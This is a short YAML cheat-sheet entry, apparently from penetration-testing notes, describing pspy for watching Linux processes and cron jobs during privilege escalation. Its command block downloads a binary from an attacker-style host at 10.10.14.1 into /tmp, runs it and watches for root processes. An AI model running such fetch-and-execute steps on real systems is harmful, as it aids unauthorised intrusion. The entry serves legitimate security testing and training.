---
description: |
  Monitor Linux processes without root. Detects cron jobs,
  scheduled tasks, and processes run by other users.
command: |
  # Download and run
  wget http://10.10.14.1/pspy64 -O /tmp/pspy
  chmod +x /tmp/pspy
  /tmp/pspy

  # Watch for cron jobs (look for UID=0 processes)
  /tmp/pspy -pf -i 1000
phase:
  - PrivEsc
target_os:
  - Linux
services: []
items:
  - Shell
techniques:
  - Linux_Misconfig
network_position:
  - Local
references:
  - https://github.com/DominicBreuker/pspy
---
